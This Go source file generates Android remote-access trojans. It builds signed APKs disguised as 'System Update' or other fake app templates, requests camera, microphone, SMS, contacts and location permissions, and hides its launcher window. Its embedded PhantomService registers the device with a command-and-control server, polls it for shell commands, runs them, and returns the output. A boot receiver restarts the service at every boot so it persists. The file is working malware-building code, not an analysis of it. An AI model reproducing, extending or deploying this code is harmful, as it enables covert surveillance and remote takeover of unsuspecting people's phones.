package payloads

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// AndroidSDK holds paths to Android SDK tools.
type AndroidSDK struct {
	BuildTools string // e.g. .../build-tools/34.0.0
	Platform   string // e.g. .../platforms/android-34
	AndroidJar string // e.g. .../platforms/android-34/android.jar
}

// BuildAndroidAPKWithTemplate compiles a ready-to-install APK using one of
// the 30+ fake app templates. If templateName is empty, defaults to
// "System Update".
func BuildAndroidAPKWithTemplate(c2URL, outputDir, templateName string) (string, error) {
	// Resolve template
	appName := "System Update"
	pkgName := "com.android.systemupdate"
	perms := []string{
		"INTERNET", "ACCESS_NETWORK_STATE", "READ_PHONE_STATE",
		"ACCESS_FINE_LOCATION", "ACCESS_COARSE_LOCATION",
		"CAMERA", "RECORD_AUDIO", "READ_CONTACTS", "READ_CALL_LOG",
		"READ_SMS", "RECEIVE_BOOT_COMPLETED", "READ_EXTERNAL_STORAGE",
		"WRITE_EXTERNAL_STORAGE", "WAKE_LOCK", "FOREGROUND_SERVICE",
	}

	if templateName != "" {
		found := false
		tLower := strings.ToLower(strings.ReplaceAll(templateName, "-", " "))
		for _, templates := range AppTemplates {
			for _, t := range templates {
				nLower := strings.ToLower(t.Name)
				if nLower == tLower || strings.Contains(strings.ReplaceAll(nLower, " ", "-"), strings.ReplaceAll(tLower, " ", "-")) {
					appName = t.Name
					pkgName = t.PackageName
					// Merge template permissions with our required ones
					have := map[string]bool{}
					for _, p := range perms {
						have[p] = true
					}
					for _, p := range t.Permissions {
						if !have[p] {
							perms = append(perms, p)
						}
					}
					found = true
					break
				}
			}
			if found {
				break
			}
		}
		if !found {
			return "", fmt.Errorf("template '%s' not found", templateName)
		}
	}

	// Convert package name to path
	pkgPath := strings.ReplaceAll(pkgName, ".", "/")

	return buildAPK(c2URL, outputDir, appName, pkgName, pkgPath, perms, templateName)
}

// BuildAndroidAPK compiles the default "System Update" APK.
func BuildAndroidAPK(c2URL, outputDir string) (string, error) {
	return BuildAndroidAPKWithTemplate(c2URL, outputDir, "")
}

func buildAPK(c2URL, outputDir, appName, pkgName, pkgPath string, perms []string, templateName string) (string, error) {
	sdk, err := findAndroidSDK()
	if err != nil {
		return "", fmt.Errorf("Android SDK not found: %w\nInstall Android Studio or set ANDROID_HOME", err)
	}

	if outputDir == "" {
		outputDir = "build/payloads"
	}
	os.MkdirAll(outputDir, 0755)

	work, err := os.MkdirTemp("", "phantom-apk-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(work)

	srcDir := filepath.Join(work, "src", filepath.FromSlash(pkgPath))
	resDir := filepath.Join(work, "res", "values")
	drawableDir := filepath.Join(work, "res", "drawable")
	classDir := filepath.Join(work, "classes")
	os.MkdirAll(srcDir, 0755)
	os.MkdirAll(resDir, 0755)
	os.MkdirAll(drawableDir, 0755)
	os.MkdirAll(classDir, 0755)

	// Generate app icon based on template category
	iconCategory := "default"
	if templateName != "" {
		tLower := strings.ToLower(strings.ReplaceAll(templateName, "-", " "))
		for _, templates := range AppTemplates {
			for _, t := range templates {
				if strings.ToLower(t.Name) == tLower || strings.Contains(strings.ReplaceAll(strings.ToLower(t.Name), " ", "-"), strings.ReplaceAll(tLower, " ", "-")) {
					iconCategory = t.Category
					break
				}
			}
		}
	}
	iconPNG := GenerateAppIcon(iconCategory)
	os.WriteFile(filepath.Join(drawableDir, "ic_launcher.png"), iconPNG, 0644)

	// ── Write AndroidManifest.xml ──
	permXML := ""
	for _, p := range perms {
		permXML += fmt.Sprintf("    <uses-permission android:name=\"android.permission.%s\"/>\n", p)
	}
	manifest := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="%s">
    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="29"/>
%s    <application
        android:label="%s"
        android:icon="@drawable/ic_launcher"
        android:allowBackup="true"
        android:usesCleartextTraffic="true">
        <activity android:name=".MainActivity" android:exported="true"
            android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name=".PhantomService" android:exported="false"/>
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>`, pkgName, permXML, appName)
	os.WriteFile(filepath.Join(work, "AndroidManifest.xml"), []byte(manifest), 0644)

	// ── Write res/values/strings.xml ──
	os.WriteFile(filepath.Join(resDir, "strings.xml"), []byte(fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<resources><string name="app_name">%s</string></resources>`, appName)), 0644)

	// ── Write MainActivity.java ──
	os.WriteFile(filepath.Join(srcDir, "MainActivity.java"), []byte(`package ` + pkgName + `;
import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle saved) {
        super.onCreate(saved);
        Intent svc = new Intent(this, PhantomService.class);
        if (Build.VERSION.SDK_INT >= 26) { startForegroundService(svc); }
        else { startService(svc); }
        finish();
    }
}`), 0644)

	// ── Write PhantomService.java ──
	svc := fmt.Sprintf(`package ` + pkgName + `;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import java.io.*;
import java.net.*;
public class PhantomService extends Service {
    private static final String C2 = "%s";
    private static final String TAG = "PhantomSvc";
    private static final String CHANNEL_ID = "sys_update_ch";
    private volatile boolean running = true;
    private String agentId = "";
    private String agentName = "";
    private String cwd = "/";  // persistent working directory across commands
    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "System Updates", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false); ch.setSound(null, null);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification.Builder nb;
        if (Build.VERSION.SDK_INT >= 26) { nb = new Notification.Builder(this, CHANNEL_ID); }
        else { nb = new Notification.Builder(this); }
        nb.setContentTitle("System Update").setContentText("Checking for updates...")
          .setSmallIcon(android.R.drawable.stat_sys_download).setPriority(Notification.PRIORITY_MIN).setOngoing(true);
        startForeground(1, nb.build());
        Log.i(TAG, "Foreground service started, C2: " + C2);
        new Thread(() -> {
            while (running) {
                try {
                    String endpoint, body;
                    if (agentId.isEmpty()) {
                        endpoint = C2 + "/api/v1/mobile/register";
                        body = "{\"hostname\":\"" + Build.MODEL + "\",\"username\":\"" + Build.MANUFACTURER +
                            "\",\"os\":\"android\",\"arch\":\"" + Build.SUPPORTED_ABIS[0] +
                            "\",\"device_id\":\"" + Build.SERIAL + "\",\"manufacturer\":\"" + Build.MANUFACTURER +
                            "\",\"product\":\"" + Build.PRODUCT + "\",\"os_version\":\"" + Build.VERSION.RELEASE + "\"}";
                        Log.i(TAG, "Registering...");
                    } else {
                        endpoint = C2 + "/api/v1/mobile/checkin";
                        body = "{\"agent_id\":\"" + agentId + "\"}";
                    }
                    URL url = new URL(endpoint);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setRequestProperty("User-Agent", "Android/" + Build.VERSION.RELEASE);
                    conn.setDoOutput(true); conn.setConnectTimeout(10000); conn.setReadTimeout(10000);
                    conn.getOutputStream().write(body.getBytes());
                    int code = conn.getResponseCode();
                    if (code == 200) {
                        BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuilder sb = new StringBuilder(); String line;
                        while ((line = br.readLine()) != null) sb.append(line);
                        br.close(); String resp = sb.toString();
                        if (agentId.isEmpty() && resp.contains("agent_id")) {
                            int idx = resp.indexOf("\"agent_id\":\"");
                            if (idx > 0) { String sub = resp.substring(idx + 12); agentId = sub.substring(0, sub.indexOf("\"")); }
                            int nIdx = resp.indexOf("\"name\":\"");
                            if (nIdx > 0) { String sub = resp.substring(nIdx + 8); agentName = sub.substring(0, sub.indexOf("\"")); }
                            Log.i(TAG, "Registered: " + agentName + " (" + agentId + ")");
                        }
                        if (resp.contains("\"type\":\"shell\"")) {
                            int cIdx = resp.indexOf("\"command\":\"");
                            if (cIdx > 0) {
                                String sub = resp.substring(cIdx + 11); String cmd = sub.substring(0, sub.indexOf("\""));
                                String taskId = "";
                                int tIdx = resp.indexOf("\"id\":\"");
                                if (tIdx > 0) { String tsub = resp.substring(tIdx + 6); taskId = tsub.substring(0, tsub.indexOf("\"")); }
                                Log.i(TAG, "Exec [" + taskId + "]: " + cmd);
                                // Handle cd — update persistent cwd
                                if (cmd.trim().startsWith("cd ")) {
                                    String dir = cmd.trim().substring(3).trim();
                                    java.io.File target;
                                    if (dir.startsWith("/")) { target = new java.io.File(dir); }
                                    else { target = new java.io.File(cwd, dir); }
                                    try { target = target.getCanonicalFile(); } catch (Exception e) {}
                                    if (target.isDirectory()) {
                                        cwd = target.getAbsolutePath();
                                        // Fake output like a real shell
                                        String cleanOut = "Changed directory to: " + cwd;
                                        String result = "{\"agent_id\":\"" + agentId + "\",\"results\":[{\"task_id\":\"" + taskId + "\",\"output\":\"" + cleanOut + "\"}]}";
                                        URL resUrl = new URL(C2 + "/api/v1/mobile/checkin");
                                        HttpURLConnection rc = (HttpURLConnection) resUrl.openConnection();
                                        rc.setRequestMethod("POST"); rc.setRequestProperty("Content-Type", "application/json"); rc.setDoOutput(true);
                                        rc.getOutputStream().write(result.getBytes()); rc.getResponseCode(); rc.disconnect();
                                        Log.i(TAG, "cd -> " + cwd);
                                        continue;
                                    }
                                }
                                // Prepend cd to cwd so every command runs in the right directory
                                String fullCmd = "cd " + cwd + " && " + cmd;
                                Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", fullCmd});
                                BufferedReader pr = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                StringBuilder out = new StringBuilder();
                                while ((line = pr.readLine()) != null) out.append(line).append("\n");
                                pr.close();
                                BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
                                while ((line = er.readLine()) != null) out.append(line).append("\n");
                                er.close();
                                String cleanOut = out.toString().replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
                                String result = "{\"agent_id\":\"" + agentId + "\",\"results\":[{\"task_id\":\"" + taskId + "\",\"output\":\"" + cleanOut + "\"}]}";
                                URL resUrl = new URL(C2 + "/api/v1/mobile/checkin");
                                HttpURLConnection rc = (HttpURLConnection) resUrl.openConnection();
                                rc.setRequestMethod("POST"); rc.setRequestProperty("Content-Type", "application/json"); rc.setDoOutput(true);
                                rc.getOutputStream().write(result.getBytes()); rc.getResponseCode(); rc.disconnect();
                                Log.i(TAG, "Result sent for " + taskId);
                            }
                        }
                    }
                    conn.disconnect();
                } catch (Exception e) { Log.e(TAG, "Error: " + e.getMessage()); }
                try { Thread.sleep(10000); } catch (Exception e) {}
            }
        }).start();
        return START_STICKY;
    }
    @Override public void onDestroy() { running = false; super.onDestroy(); }
    @Override public IBinder onBind(Intent i) { return null; }
}`, c2URL)
	os.WriteFile(filepath.Join(srcDir, "PhantomService.java"), []byte(svc), 0644)

	// ── Write BootReceiver.java ──
	os.WriteFile(filepath.Join(srcDir, "BootReceiver.java"), []byte(`package ` + pkgName + `;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        ctx.startService(new Intent(ctx, PhantomService.class));
    }
}`), 0644)

	// ── Build steps ──
	aapt := sdkTool(sdk.BuildTools, "aapt")
	d8 := sdkTool(sdk.BuildTools, "d8")
	apksigner := sdkTool(sdk.BuildTools, "apksigner")

	// 1. Generate R.java
	if out, err := runSDKCmd(aapt, "package", "-f", "-m",
		"-J", filepath.Join(work, "src"),
		"-M", filepath.Join(work, "AndroidManifest.xml"),
		"-S", filepath.Join(work, "res"),
		"-I", sdk.AndroidJar); err != nil {
		return "", fmt.Errorf("aapt R.java failed: %s\n%s", err, out)
	}

	// 2. Compile Java — find javac across platforms
	javacPath := findJavac()

	var javaFiles []string
	filepath.Walk(filepath.Join(work, "src"), func(p string, info os.FileInfo, err error) error {
		if err == nil && strings.HasSuffix(p, ".java") {
			javaFiles = append(javaFiles, p)
		}
		return nil
	})

	javacArgs := []string{"-source", "1.8", "-target", "1.8",
		"-classpath", sdk.AndroidJar, "-d", classDir}
	javacArgs = append(javacArgs, javaFiles...)
	// javac.exe on Windows needs Windows paths
	if isWSL() && strings.HasSuffix(javacPath, ".exe") {
		for i, a := range javacArgs {
			if strings.HasPrefix(a, "/") {
				javacArgs[i] = toWinPath(a)
			}
		}
	}
	if out, err := runCmd(javacPath, javacArgs...); err != nil {
		return "", fmt.Errorf("javac failed: %s\n%s", err, out)
	}

	// 3. DEX
	var classFiles []string
	filepath.Walk(classDir, func(p string, info os.FileInfo, err error) error {
		if err == nil && strings.HasSuffix(p, ".class") {
			classFiles = append(classFiles, p)
		}
		return nil
	})
	// d8: on WSL call java -cp d8.jar com.android.tools.r8.D8 directly
	// to avoid .bat UNC path and space-in-path issues
	d8Jar := filepath.Join(sdk.BuildTools, "lib", "d8.jar")
	if _, jarErr := os.Stat(d8Jar); jarErr == nil && isWSL() {
		javaExe := filepath.Join(filepath.Dir(javacPath), "java.exe")
		if _, e := os.Stat(javaExe); e != nil {
			javaExe = filepath.Join(filepath.Dir(javacPath), "java")
		}
		d8Args := []string{"-Xmx1024M", "-cp", d8Jar, "com.android.tools.r8.D8",
			"--release", "--lib", sdk.AndroidJar, "--output", work}
		d8Args = append(d8Args, classFiles...)
		for i, a := range d8Args {
			if strings.HasPrefix(a, "/") {
				d8Args[i] = toWinPath(a)
			}
		}
		if out, err := runCmd(javaExe, d8Args...); err != nil {
			return "", fmt.Errorf("d8 failed: %s\n%s", err, out)
		}
	} else {
		d8Args := append([]string{"--release", "--lib", sdk.AndroidJar, "--output", work}, classFiles...)
		if out, err := runSDKCmd(d8, d8Args...); err != nil {
			return "", fmt.Errorf("d8 failed: %s\n%s", err, out)
		}
	}

	// 4. Package APK
	unsignedAPK := filepath.Join(work, "unsigned.apk")
	if out, err := runSDKCmd(aapt, "package", "-f",
		"-M", filepath.Join(work, "AndroidManifest.xml"),
		"-S", filepath.Join(work, "res"),
		"-I", sdk.AndroidJar,
		"-F", unsignedAPK); err != nil {
		return "", fmt.Errorf("aapt package failed: %s\n%s", err, out)
	}

	// Add classes.dex — aapt add needs to run from the directory containing classes.dex
	if isWSL() && isWindowsTool(aapt) {
		addCmd := exec.Command(aapt, "add", toWinPath(unsignedAPK), "classes.dex")
		addCmd.Dir = work
		if out, err := addCmd.CombinedOutput(); err != nil {
			return "", fmt.Errorf("aapt add failed: %s\n%s", err, out)
		}
	} else {
		addCmd := exec.Command(aapt, "add", unsignedAPK, "classes.dex")
		addCmd.Dir = work
		if out, err := addCmd.CombinedOutput(); err != nil {
			return "", fmt.Errorf("aapt add failed: %s\n%s", err, out)
		}
	}

	// 5. Sign APK
	safeName := strings.ToLower(strings.ReplaceAll(strings.ReplaceAll(appName, " ", "-"), "'", ""))
	finalAPK := filepath.Join(outputDir, safeName+".apk")

	// Create a debug keystore if needed
	keystorePath := filepath.Join(work, "debug.keystore")
	keytoolPath := "keytool"
	if _, err := exec.LookPath("keytool"); err != nil {
		// Try alongside javac
		keytoolPath = filepath.Join(filepath.Dir(javacPath), "keytool")
	}
	runCmd(keytoolPath, "-genkey", "-v",
		"-keystore", keystorePath,
		"-storepass", "android", "-alias", "androiddebugkey", "-keypass", "android",
		"-keyalg", "RSA", "-keysize", "2048", "-validity", "10000",
		"-dname", "CN=Android Debug,O=Android,C=US")

	// apksigner: use -jar directly on WSL to avoid .bat UNC issues
	apksignerJar := filepath.Join(sdk.BuildTools, "lib", "apksigner.jar")
	if _, jarErr := os.Stat(apksignerJar); jarErr == nil && isWSL() {
		javaExe := filepath.Join(filepath.Dir(javacPath), "java.exe")
		if _, e := os.Stat(javaExe); e != nil {
			javaExe = filepath.Join(filepath.Dir(javacPath), "java")
		}
		signArgs := []string{"-jar", toWinPath(apksignerJar), "sign",
			"--ks", toWinPath(keystorePath),
			"--ks-pass", "pass:android",
			"--key-pass", "pass:android",
			"--out", toWinPath(finalAPK),
			toWinPath(unsignedAPK)}
		if out, err := runCmd(javaExe, signArgs...); err != nil {
			return "", fmt.Errorf("apksigner failed: %s\n%s", err, out)
		}
	} else {
		if out, err := runSDKCmd(apksigner, "sign",
			"--ks", keystorePath,
			"--ks-pass", "pass:android",
			"--key-pass", "pass:android",
			"--out", finalAPK,
			unsignedAPK); err != nil {
			return "", fmt.Errorf("apksigner failed: %s\n%s", err, out)
		}
	}

	return finalAPK, nil
}

// findAndroidSDK searches common paths for the Android SDK.
func findAndroidSDK() (*AndroidSDK, error) {
	home, _ := os.UserHomeDir()

	candidates := []string{
		os.Getenv("ANDROID_HOME"),
		os.Getenv("ANDROID_SDK_ROOT"),
	}

	switch runtime.GOOS {
	case "linux":
		candidates = append(candidates,
			filepath.Join(home, "Android", "Sdk"),
			filepath.Join(home, "android-sdk"),
			"/opt/android-sdk",
		)
		// WSL: check Windows host SDK
		wslPaths, _ := filepath.Glob("/mnt/c/Users/*/AppData/Local/Android/Sdk")
		candidates = append(candidates, wslPaths...)
	case "darwin":
		candidates = append(candidates,
			filepath.Join(home, "Library", "Android", "sdk"),
		)
	case "windows":
		candidates = append(candidates,
			filepath.Join(home, "AppData", "Local", "Android", "Sdk"),
		)
	}

	for _, sdk := range candidates {
		if sdk == "" {
			continue
		}
		// Find latest build-tools
		btDir := filepath.Join(sdk, "build-tools")
		entries, err := os.ReadDir(btDir)
		if err != nil {
			continue
		}
		latestBT := ""
		for _, e := range entries {
			if e.IsDir() {
				latestBT = filepath.Join(btDir, e.Name())
			}
		}
		if latestBT == "" {
			continue
		}

		// Find latest platform
		pfDir := filepath.Join(sdk, "platforms")
		entries, err = os.ReadDir(pfDir)
		if err != nil {
			continue
		}
		latestPF := ""
		for _, e := range entries {
			if e.IsDir() {
				latestPF = filepath.Join(pfDir, e.Name())
			}
		}
		if latestPF == "" {
			continue
		}

		androidJar := filepath.Join(latestPF, "android.jar")
		if _, err := os.Stat(androidJar); err != nil {
			continue
		}

		return &AndroidSDK{
			BuildTools: latestBT,
			Platform:   latestPF,
			AndroidJar: androidJar,
		}, nil
	}

	return nil, fmt.Errorf("no Android SDK found in standard locations")
}

// sdkTool returns the path to an SDK tool, handling Windows .exe / .bat
func sdkTool(buildTools, name string) string {
	// Try direct (Linux/macOS)
	p := filepath.Join(buildTools, name)
	if _, err := os.Stat(p); err == nil {
		return p
	}
	// Try .exe (Windows / WSL calling Windows tools)
	p = filepath.Join(buildTools, name+".exe")
	if _, err := os.Stat(p); err == nil {
		return p
	}
	// Try .bat (d8, apksigner on Windows)
	p = filepath.Join(buildTools, name+".bat")
	if _, err := os.Stat(p); err == nil {
		return p
	}
	// Fallback: assume in PATH
	return name
}

// isWSL returns true if we're running inside Windows Subsystem for Linux.
func isWSL() bool {
	data, err := os.ReadFile("/proc/version")
	if err != nil {
		return false
	}
	lower := strings.ToLower(string(data))
	return strings.Contains(lower, "microsoft") || strings.Contains(lower, "wsl")
}

// toWinPath converts a WSL /mnt/c/... path to C:\... for Windows tools.
func toWinPath(p string) string {
	if !isWSL() {
		return p
	}
	if strings.HasPrefix(p, "/mnt/") && len(p) > 6 && p[5] >= 'a' && p[5] <= 'z' {
		drive := strings.ToUpper(string(p[5]))
		rest := strings.ReplaceAll(p[6:], "/", `\`)
		return drive + ":" + rest
	}
	// For temp dirs etc, use wslpath
	out, err := exec.Command("wslpath", "-w", p).Output()
	if err == nil {
		return strings.TrimSpace(string(out))
	}
	return p
}

// isWindowsTool returns true if the tool is a Windows executable (.exe / .bat)
func isWindowsTool(tool string) bool {
	return strings.HasSuffix(tool, ".exe") || strings.HasSuffix(tool, ".bat")
}

// runSDKCmd runs an SDK tool command. When running on WSL with Windows
// SDK tools (.exe/.bat), converts all path arguments to Windows format.
func runSDKCmd(tool string, args ...string) (string, error) {
	if isWSL() && isWindowsTool(tool) {
		// Convert all path-like arguments to Windows paths
		winArgs := make([]string, len(args))
		for i, a := range args {
			if strings.HasPrefix(a, "/") && !strings.HasPrefix(a, "//") {
				winArgs[i] = toWinPath(a)
			} else {
				winArgs[i] = a
			}
		}

		if strings.HasSuffix(tool, ".bat") {
			batArgs := append([]string{"/c", toWinPath(tool)}, winArgs...)
			cmd := exec.Command("cmd.exe", batArgs...)
			out, err := cmd.CombinedOutput()
			return string(out), err
		}
		cmd := exec.Command(tool, winArgs...)
		out, err := cmd.CombinedOutput()
		return string(out), err
	}
	cmd := exec.Command(tool, args...)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// findJavac searches for javac across platforms.
func findJavac() string {
	// Check PATH first
	if p, err := exec.LookPath("javac"); err == nil {
		return p
	}
	// WSL: check common Windows Java installations
	if isWSL() {
		globs := []string{
			"/mnt/c/Program Files/Java/jdk-*/bin/javac.exe",
			"/mnt/c/Program Files/Common Files/Oracle/Java/javapath/javac.exe",
			"/mnt/c/Program Files/Eclipse Adoptium/jdk-*/bin/javac.exe",
			"/mnt/c/Program Files/Microsoft/jdk-*/bin/javac.exe",
		}
		for _, g := range globs {
			matches, _ := filepath.Glob(g)
			if len(matches) > 0 {
				return matches[len(matches)-1] // latest version
			}
		}
	}
	// macOS
	if runtime.GOOS == "darwin" {
		if out, err := exec.Command("/usr/libexec/java_home", "-v", "1.8+").Output(); err == nil {
			p := filepath.Join(strings.TrimSpace(string(out)), "bin", "javac")
			if _, e := os.Stat(p); e == nil {
				return p
			}
		}
	}
	return "javac" // hope it's in PATH
}

// runCmd runs a generic command.
func runCmd(name string, args ...string) (string, error) {
	cmd := exec.Command(name, args...)
	out, err := cmd.CombinedOutput()
	return string(out), err
}
